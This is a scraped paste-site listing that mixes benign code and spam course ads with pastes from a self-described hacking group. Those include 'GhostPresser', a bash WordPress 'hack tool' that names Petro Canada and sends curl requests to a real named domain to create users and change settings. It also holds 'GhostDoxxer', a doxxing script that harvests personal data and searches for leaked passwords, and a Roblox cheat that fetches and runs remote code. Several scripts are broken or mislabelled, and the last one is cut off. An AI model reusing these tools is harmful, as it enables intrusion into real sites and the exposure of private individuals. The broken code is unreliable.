Python has become one of the most popular programming languages in recent years. Many professionals and students alike have discovered the vast potential for data science and machine learning applications using Python.
for more:https://dz-linkk.com/ja334"
Ex1S6LzB,Untitled,sissou123,Python,Sunday 24th of December 2023 02:12:36 PM CDT,"Python 3: Deep Dive (Part 2 – Iteration, Generators)

You’ll be able to leverage the concepts in this course to take your Python Programming skills at the next level
Sequence Types and the sequence protocols
Iterables and iterable protocol
Iterators, the iterator protocol
for more:https://dz-linkk.com/Yu41i"
e9hh4Cj7,Untitled,AlexArst,C++,Sunday 24th of December 2023 02:12:16 PM CDT,"#include <iostream>
#include ""bMatrix.h""

const int WALL = 0, PASS = 1;

bool DeadEnd(int x, int y, bMatrix b) {
    int a = 0;
    if (x != 1) {
        if (b.get(x - 2, y) == PASS) a += 1;
    } else a += 1;

    if (y != 1) {
        if (b.get(x, y - 2) == PASS) a += 1;
    } else a += 1;

    if (x != b.count_columns - 2) {
        if (b.get(x + 2, y) == PASS) a += 1;
    } else a += 1;

    if (y != b.count_rows - 2) {
        if (b.get(x, y + 2) == PASS) a += 1;
    } else a += 1;

    if (a == 4)
        return true;
    return false;
}

bMatrix MazeMake(int height, int width) {
    if (height % 2 == 0) height++;
    if (width % 2 == 0) width++;
    int x, y;
    int start_position_x = 3;
    int start_position_y = 3;
    bMatrix a(width, height);
    while (start_position_x != 3 || start_position_y != 1) {
        x = start_position_x;
        y = start_position_y;
        start_position_y += 2;
        if (start_position_y > height - 2) {
            start_position_y = 1;
            start_position_x += 2;
            if (start_position_x > width - 2)
                start_position_x = 1;
        }
        if (a.get(x, y) == WALL && x != 3 && y != 3) continue;
        a.set(x, y, true);
        while (!DeadEnd(x, y, a))
            switch (rand() % 4) {
                case 0:
                    if (y != 1 && a.get(x, y - 2) == WALL) {
                        a.set(x, y - 1, true);
                        a.set(x, y - 2, true);
                        y -= 2;
                    }
                    break;
                case 1:
                    if (y != height - 2 && a.get(x, y + 2) == WALL) {
                        a.set(x, y + 1, true);
                        a.set(x, y + 2, true);
                        y += 2;
                    }
                    break;
                case 2:
                    if (x != 1 && a.get(x - 2, y) == WALL) {
                        a.set(x - 1, y, true);
                        a.set(x - 2, y, true);
                        x -= 2;
                    }
                    break;
                case 3:
                    if (x != width - 2 && a.get(x + 2, y) == WALL) {
                        a.set(x + 1, y, true);
                        a.set(x + 2, y, true);
                        x += 2;
                    }
                    break;
            }
    }
    return a;
}

void OutPut(bMatrix a) {
    for (int i = 0; i < a.count_rows; i++) {
        for (int j = 0; j < a.count_columns; j++)
            std::cout << (a.get(i, j) == WALL ? ""# "" : ""  "");
        std::cout << std::endl;
    }
}

int main() {
    int height = 58;
    int width = 58;
    bMatrix a = MazeMake(height, width);
    OutPut(a);
    return 0;
}"
ZfgFy3mA,Clover,Malachoni,Lua,Sunday 24th of December 2023 02:04:53 PM CDT,"getgenv().AutoFarm = true
getgenv().Npc = {""Wolf Hunter""}

getgenv().Position = Vector3.new(0,nil,8) -- x y z but dont touch ""nil"" cause it does nothing, [5] is what determinds how far away behind npc. The lower value the closer to the npc max [1].

getgenv().OffsetY = 0

getgenv().MethodX = ""Tween"" -- MethodXs: [""Tween"",""Teleport""].
getgenv().TweenDurationX = 0.25 -- 0.25 Recommended, The higher the value the more slower it becomes, 0.1 is almost like teleportion.

getgenv().Attacking = function()
    local args = {[1] = ""M1""}
    game:GetService(""ReplicatedStorage"").ReplicatedPackage.Remotes.action:FireServer(unpack(args))
end

loadstring(game:HttpGet(""https://raw.githubusercontent.com/Lvl9999/AutoFarmer/main/Universal""))();"
MKJNK7FU,phrasesStorage.py,alekssamos,Python,Sunday 24th of December 2023 01:57:18 PM CDT,"import sqlite3

class PhrasesStorage():
    dbfile = ""phrases.db""
    def __init__(self):
        with sqlite3.connect(self.dbfile) as conn:
            cursor = conn.cursor()
            cursor.execute(""""""CREATE TABLE IF NOT EXISTS phrases
            (id INTEGER PRIMARY KEY, phrase TEXT)
            """""")

    def editPhrase(self, id, new_text):
        with sqlite3.connect(self.dbfile) as conn:
            cursor = conn.cursor()
            cursor.execute(""UPDATE phrases SET phrase=? WHERE id=?"", (new_text, id,))
            conn.commit()
            return True

    def getPhrases(self, id=None):
        with sqlite3.connect(self.dbfile) as conn:
            cursor = conn.cursor()
            if id is None:
                cursor.execute(""SELECT * FROM phrases"")
            else:
                cursor.execute(""SELECT * FROM phrases WHERE id=?"", [(id)])
            return cursor.fetchall()

    def addPhrase(self, text):
        with sqlite3.connect(self.dbfile) as conn:
            cursor = conn.cursor()
            cursor.execute(""INSERT INTO phrases (phrase) VALUES (?)"", (text,))
            conn.commit()
            return True

    def deletePhrase(self, id):
        with sqlite3.connect(self.dbfile) as conn:
            cursor = conn.cursor()
            cursor.execute(""DELETE FROM phrases WHERE id=?"", [(id),])
            conn.commit()
            return True


def main():
    ps = PhrasesStorage()
    ps.addPhrase(""Привет"")
    ps.addPhrase(""Как дела"")
    ps.addPhrase(""Что делаешь"")
    phrases = ps.getPhrases()
    ps.deletePhrase( phrases[1][0] )
    phrases = ps.getPhrases()
    ps.editPhrase( phrases[-1][0], ""Как поживаешь?"" )
    phrases = ps.getPhrases()
    for p in phrases:
        print(p[0], p[1])

if __name__ == ""__main__"":
    main()
"
e4nAtrtR,Untitled,kingbode,Python,Sunday 24th of December 2023 01:48:12 PM CDT,"def get_student_name(students):
    """"""
    This function takes a dictionary of students and their grades
    and returns the name(s) of the student(s) with the lowest grade above the minimum grade
    """"""
    min_grade = min(students.values())
    # sort the dictionary by values
    students = sorted(students.items(), key=lambda x: x[1])

    results = []
    result = None

    for name, grade in students:
        if grade > min_grade and not results:
            results.append(name)
            result = grade
        elif grade == result:
            results.append(name)
        else:
            continue

    return results


students = {'r': 0, 'b': 0, 'c': 3, 'n': 10, 'e': 50 , 'a': 3}
print(get_student_name(students))"
LVrU1yLS,Untitled,sissou123,C,Sunday 24th of December 2023 01:21:06 PM CDT,"Mastering Data Structures & Algorithms using C and C++
Learn, Analyse and Implement Data Structure using C and C++. Learn Recursion and Sorting.
for more:https://dz-linkk.com/d86Uq"
X9HjX64s,In The Year 2048...,xGHOSTSECx,Python,Sunday 24th of December 2023 01:12:37 PM CDT,"import os
import zipfile
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.fernet import Fernet
import hashlib

# Generate or load RSA keys
def generate_rsa_keypair(key_size=4096):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=key_size
    )
    return private_key, private_key.public_key()

def save_rsa_key(key, filename, passphrase=None):
    with open(filename, ""wb"") as key_file:
        if passphrase:
            key_pem = key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.BestAvailableEncryption(passphrase),
            )
        else:
            key_pem = key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
        key_file.write(key_pem)

def load_rsa_key(filename, passphrase=None):
    with open(filename, ""rb"") as key_file:
        key_pem = key_file.read()
        if passphrase:
            return serialization.load_pem_private_key(key_pem, passphrase)
        else:
            return serialization.load_pem_private_key(key_pem, None)

# Encrypt a file using Fernet symmetric encryption
def encrypt_file(file_path, output_path, fernet_key):
    cipher_suite = Fernet(fernet_key)

    with open(file_path, ""rb"") as file:
        file_data = file.read()

    encrypted_data = cipher_suite.encrypt(file_data)

    with open(output_path, ""wb"") as encrypted_file:
        encrypted_file.write(encrypted_data)

# Decrypt a file using Fernet symmetric encryption
def decrypt_file(file_path, output_path, fernet_key):
    cipher_suite = Fernet(fernet_key)

    with open(file_path, ""rb"") as file:
        encrypted_data = file.read()

    decrypted_data = cipher_suite.decrypt(encrypted_data)

    with open(output_path, ""wb"") as decrypted_file:
        decrypted_file.write(decrypted_data)

# Sign a file with the RSA private key
def sign_file(file_path, private_key):
    with open(file_path, ""rb"") as file:
        data = file.read()

    signature = private_key.sign(
        data,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )

    with open(file_path + "".sig"", ""wb"") as signature_file:
        signature_file.write(signature)

# Verify the digital signature of a file
def verify_signature(file_path, public_key):
    with open(file_path, ""rb"") as file:
        data = file.read()

    with open(file_path + "".sig"", ""rb"") as signature_file:
        signature = signature_file.read()

    try:
        public_key.verify(
            signature,
            data,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except Exception:
        return False

# Calculate the hash of a file
def calculate_hash(file_path):
    sha256_hash = hashlib.sha256()
    with open(file_path, ""rb"") as file:
        while True:
            data = file.read(65536)
            if not data:
                break
            sha256_hash.update(data)
    return sha256_hash.hexdigest()

# Encrypt a Fernet key with RSA public key
def encrypt_fernet_key(fernet_key, public_key):
    encrypted_key = public_key.encrypt(
        fernet_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return encrypted_key

# Decrypt a Fernet key with RSA private key
def decrypt_fernet_key(encrypted_key, private_key):
    fernet_key = private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return fernet_key

# Encrypt multiple files into a single archive
def encrypt_multiple_files(file_paths, output_archive, fernet_key):
    with zipfile.ZipFile(output_archive, 'w') as archive:
        for file_path in file_paths:
            archive.write(file_path, os.path.basename(file_path))
    
    # Encrypt the entire archive using Fernet
    encrypt_file(output_archive, output_archive + "".enc"", fernet_key)
    
    # Remove the unencrypted archive
    os.remove(output_archive)

# Decrypt a single archive containing multiple files
def decrypt_multiple_files(archive_path, output_dir, fernet_key):
    # Decrypt the encrypted archive using Fernet
    decrypt_file(archive_path, archive_path + "".dec"", fernet_key)
    
    # Extract files from the decrypted archive
    with zipfile.ZipFile(archive_path + "".dec"", 'r') as archive:
        archive.extractall(output_dir)
    
    # Remove the decrypted archive
    os.remove(archive_path + "".dec"")

# Main function
def main():
    # Step 1: Generate or load RSA keys
    private_key, public_key = generate_rsa_keypair()
    save_rsa_key(private_key, ""private_key.pem"", b'Passphrase123')  # Replace passphrase
    save_rsa_key(public_key, ""public_key.pem"")

    # Step 2: Encrypt a file with Fernet
    fernet_key = Fernet.generate_key()
    encrypt_file(""input.txt"", ""encrypted.fernet"", fernet_key)

    # Step 3: Encrypt the Fernet key with the RSA public key
    public_key = load_rsa_key(""public_key.pem"")
    encrypted_fernet_key = encrypt_fernet_key(fernet_key, public_key)

    with open(""encrypted_fernet_key"", ""wb"") as fernet_key_file:
        fernet_key_file.write(encrypted_fernet_key)

    # Step 4: Sign the file with the RSA private key
    sign_file(""input.txt"", private_key)

    # Step 5: Verify the digital signature of the file
    verified = verify_signature(""input.txt"", public_key)
    if verified:
        print(""Digital signature is valid."")
    else:
        print(""Digital signature is invalid or missing."")

    # Step 6: Calculate the hash of the encrypted Fernet key
    encrypted_fernet_key_hash = calculate_hash(""encrypted_fernet_key"")
    print(f""Hash of the encrypted Fernet key: {encrypted_fernet_key_hash}"")

    # Step 7: Decrypt the Fernet key with the RSA private key
    encrypted_fernet_key = open(""encrypted_fernet_key"", ""rb"").read()
    private_key = load_rsa_key(""private_key.pem"", b'Passphrase123')  # Replace passphrase
    fernet_key = decrypt_fernet_key(encrypted_fernet_key, private_key)

    # Step 8: Decrypt the file with the decrypted Fernet key
    decrypt_file(""encrypted.fernet"", ""decrypted.txt"", fernet_key)
    print(""File encrypted and decrypted successfully."")

    # Step 9: Encrypt multiple files into a single archive
    file_paths_to_encrypt = [""file1.txt"", ""file2.txt""]
    output_archive = ""multiple_files_archive.zip""
    encrypt_multiple_files(file_paths_to_encrypt, output_archive, fernet_key)
    
    # Step 10: Decrypt a single archive containing multiple files
    output_dir = ""decrypted_files""
    decrypt_multiple_files(output_archive, output_dir, fernet_key)
    
    print(""Multiple files encrypted and decrypted successfully."")

if __name__ == ""__main__"":
    main()"
wFvLvUi8,GhostPresser ( Hack Tool Designed To XSS Suncor Thru 3rd Party Petro Canada,xGHOSTSECx,Bash,Sunday 24th of December 2023 01:08:20 PM CDT,"bash
#!/bin/bash

# GhostPresser Wordpress Admin Bypass And Hack Tool
# Petro Canada Hack
# We Are GhostSec

get_user_input() {
    read -p ""$1: "" input_value
    echo ""$input_value""
}

handle_error() {
    local error_message=""$1""
    echo ""Error: $error_message""
    exit 1
}

login_and_action() {
    local wp_admin_user
    local wp_admin_pass
    local wp_url

    wp_admin_user=$(get_user_input ""Enter WordPress Admin Username"")
    wp_admin_pass=$(get_user_input -s ""Enter WordPress Admin Password"")
    wp_url=$(get_user_input ""Enter WordPress URL"")

    response=$(curl -s -X POST -d ""log=$wp_admin_user&pwd=$wp_admin_pass&wp-submit=Log+In&redirect_to=$wp_url/wp-admin/plugins.php&testcookie=1&exploitwp553=1"" ""$wp_url/wp-login.php?action=postpass"")

    if [[ $response == *""Error""* ]]; then
        handle_error ""Login failed. Check your credentials and try again.""
    else
        echo ""Login successful. Action performed.""
    fi
}

activate_plugin() {
    local plugin_name
    local wordpress_logged_in_cookie

    plugin_name=$(get_user_input ""Enter Plugin Name"")
    wordpress_logged_in_cookie=$(get_user_input ""Enter WordPress Logged In Cookie"")

    response=$(curl -s -X POST -d ""plugin=$plugin_name&action=activate"" -b ""wordpress_logged_in_cookie=$wordpress_logged_in_cookie"" https://karholdings.ca/wp-admin/admin-ajax.php)

    if [[ $response == *""Error""* ]]; then
        handle_error ""Plugin activation failed. Check the plugin name and try again.""
    else
        echo ""Plugin activation successful.""
    fi
}

deactivate_plugin() {
    local plugin_name
    local wordpress_logged_in_cookie

    plugin_name=$(get_user_input ""Enter Plugin Name"")
    wordpress_logged_in_cookie=$(get_user_input ""Enter WordPress Logged In Cookie"")

    response=$(curl -s -X POST -d ""plugin=$plugin_name&action=deactivate"" -b ""wordpress_logged_in_cookie=$wordpress_logged_in_cookie"" https://karholdings.ca/wp-admin/admin-ajax.php)

    if [[ $response == *""Error""* ]]; then
        handle_error ""Plugin deactivation failed. Check the plugin name and try again.""
    else
        echo ""Plugin deactivation successful.""
    fi
}

update_core() {
    local wordpress_logged_in_cookie

    wordpress_logged_in_cookie=$(get_user_input ""Enter WordPress Logged In Cookie"")

    response=$(curl -s -X POST -d ""update-core=true"" -b ""wordpress_logged_in_cookie=$wordpress_logged_in_cookie"" https://karholdings.ca/wp-admin/admin-ajax.php)

    if [[ $response == *""Error""* ]]; then
        handle_error ""WordPress core update failed. Check your credentials and try again.""
    else
        echo ""WordPress core update successful.""
    fi
}

create_user() {
    local new_user
    local new_password
    local new_user_email
    local wordpress_logged_in_cookie

    new_user=$(get_user_input ""Enter New User Name"")
    new_password=$(get_user_input -s ""Enter New User Password"")
    new_user_email=$(get_user_input ""Enter New User Email"")
    wordpress_logged_in_cookie=$(get_user_input ""Enter WordPress Logged In Cookie"")

    response=$(curl -s -X POST -d ""user_login=$new_user&user_pass=$new_password&email=$new_user_email"" -b ""wordpress_logged_in_cookie=$wordpress_logged_in_cookie"" https://karholdings.ca/wp-admin/admin-ajax.php)

    if [[ $response == *""Error""* ]]; then
        handle_error ""User creation failed. Check the user details and try again.""
    else
        echo ""User creation successful.""
    fi
}

change_settings() {
    local option_name
    local option_value
    local wordpress_logged_in_cookie

    option_name=$(get_user_input ""Enter Option Name"")
    option_value=$(get_user_input ""Enter New Option Value"")
    wordpress_logged_in_cookie=$(get_user_input ""Enter WordPress Logged In Cookie"")

    response=$(curl -s -X POST -d ""option_name=$option_name&option_value=$option_value"" -b ""wordpress_logged_in_cookie=$wordpress_logged_in_cookie"" https://karholdings.ca/wp-admin/admin-ajax.php)

    if [[ $response == *""Error""* ]]; then
        handle_error ""Changing site settings failed. Check the option details and try again.""
    else
        echo ""Site settings changed successfully.""
    fi
}

install_theme() {
    local theme_name
    local wordpress_logged_in_cookie

    theme_name=$(get_user_input ""Enter Theme Name"")
    wordpress_logged_in_cookie=$(get_user_input ""Enter WordPress Logged In Cookie"")

    response=$(curl -s -X POST -d ""theme=$theme_name&action=install-theme"" -b ""wordpress_logged_in_cookie=$wordpress_logged_in_cookie"" https://karholdings.ca/wp-admin/admin-ajax.php)

    if [[ $response == *""Error""* ]]; then
        handle_error ""Theme installation failed. Check the theme name and try again.""
    else
        echo ""Theme installation successful.""
    fi
    
}

while true; do
    dialog --clear --backtitle ""GhostPresser - WordPress Hack Tool"" \
        --title ""Main Menu"" \
        --menu ""Choose an option:"" \
        1 ""Bypass Login and Perform Action"" \
        2 ""Activate a Plugin"" \
        3 ""Deactivate a Plugin"" \
        4 ""Update WordPress Core"" \
        5 ""Create a New User"" \
        6 ""Change WordPress Settings"" \
        7 ""Install a New Theme"" \
        8 ""Perform Advanced Audit"" \
        9 ""Perform Expert Audit"" \
        10 ""Advanced Audit"" \
        11 ""Expert Audit"" \
        12 ""Exit"" 2>
        
        choicecase $(<choice) in
        1) bypass login_and_action ;;
        2) activate_plugin ;;
        3) deactivate_plugin ;;
        4) update_core ;;
        5) create_user ;;
        6) change_settings ;;
        7) install_theme ;;
        8) perform_advanced_audit ;;
        9) perform_expert_audit ;;
        10) exit ;;
        *) handle_error ""Invalid choice. Please try again."" ;;
    esac
done"
PJAk1UMb,Termux Internal Audit Tool,xGHOSTSECx,Bash,Sunday 24th of December 2023 01:04:44 PM CDT,"#!/data/data/com.termux/files/usr/bin/bash

# Function to handle errors
handle_error() {
    echo -e ""\e[91mError: $1\e[0m""
    exit 1
}

# Function to display the header
display_header() {
    echo -e ""\e[1m\e[94m""
    echo ""********************************************""
    echo ""         GhostDroid Internal Audit Tool     ""
    echo ""********************************************""
    echo -e ""\e[0m""
}

# Function to display the footer
display_footer() {
    echo -e ""\e[2mWritten by Michael Errington, Founder of GhostSec\e[0m""
}

# Function to display a section title
display_section_title() {
    echo -e ""\e[1m\e[94m$1\e[0m""
}

# Function to display a success message
display_success() {
    echo -e ""\e[92m$1\e[0m""
}

# Function to display a warning message
display_warning() {
    echo -e ""\e[93m$1\e[0m""
}

# Function to display an information message
display_info() {
    echo -e ""\e[94m$1\e[0m""
}

# Display the header
display_header

# Function to handle errors
handle_error() {
    echo ""Error: $1""
    exit 1
}

# Function to display the help menu
display_help() {
    echo ""Android Audit Tool - Comprehensive Android app auditing""
    echo
    echo ""Usage: android-audit [OPTIONS] [AUDIT_DIRECTORY]""
    echo
    echo ""Options:""
    echo ""  -h, --help         Display this help menu""
    echo ""  -p, --packages     Specify specific packages to audit (comma-separated)""
    echo ""  -a, --all          Audit all installed packages""
    echo
    echo ""Examples:""
    echo ""  android-audit -p com.example.app,com.another.app /path/to/audit_directory""
    echo ""  android-audit -a /path/to/audit_directory""
}

# Install necessary packages and dependencies
pkg install -y aapt pm jq curl unzip apktool jadx mobSF || handle_error ""Failed to install required packages.""

# Directory to store audit information
audit_dir=""$HOME/app_info""

# Option to specify the audit directory as an argument
if [ ""$1"" ]; then
    audit_dir=""$1""
fi

# Ensure the audit directory exists
mkdir -p ""$audit_dir"" || handle_error ""Failed to create audit directory.""

# List installed packages and their information
pm list packages -3 -f | cut -d ""="" -f 2 > ""$audit_dir/app_list.txt"" || handle_error ""Failed to list installed packages.""

# Function to extract app information using aapt and save it to a JSON file
extract_app_info() {
    package_name=""$1""
    app_info_file=""$audit_dir/${package_name}_info.json""
    aapt dump badging ""$package_name"" | jq -Rn 'reduce inputs as $line ({}; .[$line|split(""="")[0]] = ($line|split(""="")[1]))' > ""$app_info_file"" || handle_error ""Failed to extract app information for $package_name.""
}

# Function to create web redirects for specified package names
create_web_redirects() {
    package_name=""$1""
    redirect_file=""$audit_dir/${package_name}/web_redirects.txt""
    # Add your expert logic to generate web redirects here
    # Example: Use a web scraping tool to discover web links from the app
    # scrape_web_links ""$package_name"" > ""$redirect_file""
}

# Function to decompile the app and analyze its source code
decompile_and_analyze() {
    package_name=""$1""
    decompile_dir=""$audit_dir/${package_name}/source_code""
    # Use apktool to decompile the app
    apktool d -o ""$decompile_dir"" ""$package_name"" || handle_error ""Failed to decompile the app.""

    # Perform advanced analysis on the decompiled source code
    # Example: Use JADX to analyze the decompiled Java code
    jadx -d ""$decompile_dir"" ""$decompile_dir"" || handle_error ""Failed to analyze the app source code.""
}

# Perform security checks and vulnerability assessments using MobSF
security_audit() {
    package_name=""$1""
    security_report_dir=""$audit_dir/${package_name}/security_report""
    mobSF -f ""$package_name"" -o ""$security_report_dir"" || handle_error ""Failed to perform security audit.""
}

# Process command line options
while [[ $# -gt 0 ]]; do
    case ""$1"" in
        -h|--help)
            display_help
            exit 0
            ;;
        -p|--packages)
            shift
            packages_to_audit=($(echo ""$1"" | tr ',' ' '))
            ;;
        -a|--all)
            packages_to_audit=($(cut -d ""="" -f 2 ""$audit_dir/app_list.txt""))
            ;;
        *)
            echo ""Invalid option: $1""
            display_help
            exit 1
            ;;
    esac
    shift
done

# Option to specify specific packages to audit
for package in ""${packages_to_audit[@]}""; do
    if grep -q ""$package"" ""$audit_dir/app_list.txt""; then
        extract_app_info ""$package""
        mkdir -p ""$audit_dir/${package}""
        create_web_redirects ""$package""
        decompile_and_analyze ""$package""
        security_audit ""$package""
    else
        echo ""Package '$package' not found in the app list.""
    fi
done

echo ""App information and analysis reports have been saved in $audit_dir."""
RExhApit,Credit Card Generator,xGHOSTSECx,Java,Sunday 24th of December 2023 12:58:31 PM CDT,"* Credit Card Validator Tool
* Provides comprehensive credit card validation with custom options.
*
* Usage:
* var options = {
*   customCardTypes: [
*     {
*       name: 'CustomCard',
*       pattern: '^123',
*       valid_length: [16]
*     },
*     // Add more custom card types as needed
*   ],
*   useJQuery: true
* };
*
* var creditCardValidator = new CreditCardValidator(options);
* var creditCardNumber = '4111-1111-1111-1111';
* var expirationDate = '12/25';
* var cardholderName = 'John Doe';
*
* creditCardValidator.validateCreditCard(creditCardNumber, expirationDate, cardholderName, function (error, result) {
*   if (error) {
*     console.error('Validation failed:', error.message);
*   } else {
*     console.log('Validation result:', result);
*   }
* });
*/
var CreditCardValidator = (function () {
function Trie() {
this.trie = {};
this.push = function (value) {
value = value.toString();
var obj = this.trie;
for (var i = 0; i < value.length; i++) {
var char = value[i];
if (obj[char] == null) {
obj[char] = (i === value.length - 1) ? null : {};
}
obj = obj[char];
}
};
this.find = function (value) {
value = value.toString();
var obj = this.trie;
for (var i = 0; i < value.length; i++) {
var char = value[i];
if (obj.hasOwnProperty(char)) {
if (obj[char] === null) {
return true;
}
} else {
return false;
}
obj = obj[char];
}
};
}
function Range(trie1) {
if (!(trie1 instanceof Trie)) {
throw new Error('Range constructor requires a Trie parameter');
}
this.trie = trie1;
this.rangeWithString = function (ranges) {
if (typeof ranges !== 'string') {
throw new Error('rangeWithString requires a string parameter');
}
ranges = ranges.replace(/ /g, '');
ranges = ranges.split(',');
for (var j = 0; j < ranges.length; j++) {
var range = ranges[j];
if (r = range.match(/^(\d+)-(\d+)$/)) {
for (var n = parseInt(r[1]); n <= parseInt(r[2]); n++) {
this.trie.push(n);
}
} else if (range.match(/^\d+$/)) {
this.trie.push(range);
} else {
throw new Error(""Invalid range '"" + r + ""'"");
}
}
return new Range(this.trie);
};
this.match = function (number) {
return this.trie.find(number);
};
}
function CreditCardValidator(options) {
options = options || {};
var trie = new Trie();
var cardTypes = [
{
name: 'Visa',
pattern: '^4',
valid_length: [13, 16]
},
{
name: 'MasterCard',
pattern: '^(5[1-5]|2[2-7])',
valid_length: [16]
},
{
name: 'Amex',
pattern: '^3[47]',
valid_length: [15]
},
// Add more card types as needed
];
var customCardTypes = options.customCardTypes || [];
var allCardTypes = cardTypes.concat(customCardTypes);
function normalize(number) {
return number.replace(/[ -]/g, '');
}
function validateCardNumber(number) {
for (var i = 0; i < allCardTypes.length; i++) {
var cardType = allCardTypes[i];
if (new RegExp(cardType.pattern).test(number)) {
return {
cardType: cardType.name,
isValid: trie.find(number),
validLengths: cardType.valid_length
};
}
}
return {
cardType: 'Unknown',
isValid: false,
validLengths: []
};
}
function isExpired(expirationDate) {
var currentDate = new Date();
var inputDate = new Date(expirationDate);
return inputDate < currentDate;
}
function validateCardholderName(cardholderName) {
return /^[a-zA-Z\s]+$/.test(cardholderName);
}
this.validateCreditCard = function (creditCardNumber, expirationDate, cardholderName, callback) {
try {
if (options.useJQuery && typeof window.jQuery === 'undefined') {
throw new Error('jQuery is required for credit card validation');
}
var normalizedNumber = normalize(creditCardNumber);
var validationResult = validateCardNumber(normalizedNumber);
validationResult.isExpired = isExpired(expirationDate);
validationResult.isValidCardholderName = validateCardholderName(cardholderName);
if (typeof callback === 'function') {
callback(null, validationResult);
}
return validationResult;
} catch (error) {
if (typeof callback === 'function') {
callback(error, null);
}
return null;
}
};
}
return CreditCardValidator;
})();
// Help Menu
console.log('Credit Card Validator Tool');
console.log('---------------------------');
console.log('Usage:');
console.log('var options = {');
console.log('  customCardTypes: [');
console.log('    {');
console.log('      name: \'CustomCard\',');
console.log('      pattern: \'^123\',');
console.log('      valid_length: [16]');
console.log('    },');
console.log('    // Add more custom card types as needed');
console.log('  ],');
console.log('  useJQuery: true');
console.log('};');
console.log('');
console.log('var creditCardValidator = new CreditCardValidator(options);');
console.log('var creditCardNumber = \'4111-1111-1111-1111\';');
console.log('var expirationDate = \'12/25\';');
console.log('var cardholderName = \'John Doe\';');
console.log('');
console.log('creditCardValidator.validateCreditCard(creditCardNumber, expirationDate, cardholderName, function (error, result) {');
console.log('  if (error) {');
console.log('    console.error(\'Validation failed:\', error.message);');
console.log('  } else {');
console.log('    console.log(\'Validation result:\', result);');
console.log('  }');
console.log('});');"
FDdD4MEn,EyeSeeYou (Bitch),xGHOSTSECx,Python,Sunday 24th of December 2023 12:54:54 PM CDT,"# EyeSeeYou (Bitch)
# Author: GhostSec Hackers
# Date: September 20, 2023
import sys
import os
import time
import random
import threading
import requests
from colorama import init, Fore
from datetime import date
import re
from googlesearch import search
from core.leaked import leaked
from terminaltables import SingleTable
import json
init()
# Initialize colorama for colored text
warning = ""["" + Fore.RED + ""!"" + Fore.RESET + ""]""
found = ""["" + Fore.GREEN + ""+"" + Fore.RESET + ""]""
wait = ""["" + Fore.MAGENTA + ""*"" + Fore.RESET + ""]""
class GhostDoxxer:
    def __init__(self, data):
        self.data = data
        self.email = None
        self.telephone = None
        self.urls = None
        self.ipv4 = None
        self.ipv6 = None
    def extract_info(self):
        self.extract_email()
        self.extract_telephone()
        self.extract_urls()
        self.extract_ipv4()
        self.extract_ipv6()
    def extract_email(self):
        self.email = re.findall(r'[a-zA-Z0-9+_\-\.]+@[0-9a-zA-Z][.-0-9a-zA-Z]*.[a-zA-Z]+', self.data)
    def extract_telephone(self):
        self.telephone = re.findall(r""(0|\\+33|0033)[1-9][0-9]{8}"", self.data)
    def extract_urls(self):
        self.urls = re.findall(
            'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', self.data)
    def extract_ipv4(self):
        self.ipv4 = re.findall(
            r""^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"", self.data)
    def extract_ipv6(self):
        self.ipv6 = re.findall(
            r""^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|""
            r""([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|""
            r""([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|""
            r""([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|""
            r""([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|""
            r""([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|""
            r""[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|""
            r"":((:[0-9a-fA-F]{1,4}){1,7}|:)|""
            r""fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|""
            r""::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|""
            r""(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|""
            r""(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|""
            r""([0-9a-fA-F]{1,4}:){1,4}:""
            r""((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|""
            r""(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$"", self.data)
    def google_search(self, query):
        print(""\n""+Fore.BLUE+""[I]""+Fore.RESET+"" Performing Google search...\n"")
        try:
            results = search(query, num=20, stop=20, pause=2)
            for i, result in enumerate(results, start=1):
                print(f""{Fore.GREEN}[+]{Fore.RESET} Result {i}: {result}"")
        except Exception as e:
            print(f""{Fore.RED}[!]{Fore.RESET} An error occurred during the Google search: {e}"")
    def search_email(self):
        email = input("" Email: "")
        print(""\n""+wait+"" Searching information for '%s'..."" % (email))
        lkd = leaked()
        leak = lkd.email(email)
        if leak:
            TABLE_DATA = [('Title', 'Domain', 'Date'), ]
            for lk in leak:
                name = lk['Title']
                domain = lk['Domain']
                date = lk['Date']
                tuples = (name, domain, date)
                TABLE_DATA.append(tuples)
            table = SingleTable(TABLE_DATA, "" Leaked Site "")
            print(table.table)
            print(""\n""+wait+"" Searching for Passwords..."")
        table_dump = [('Email', 'Password'), ]
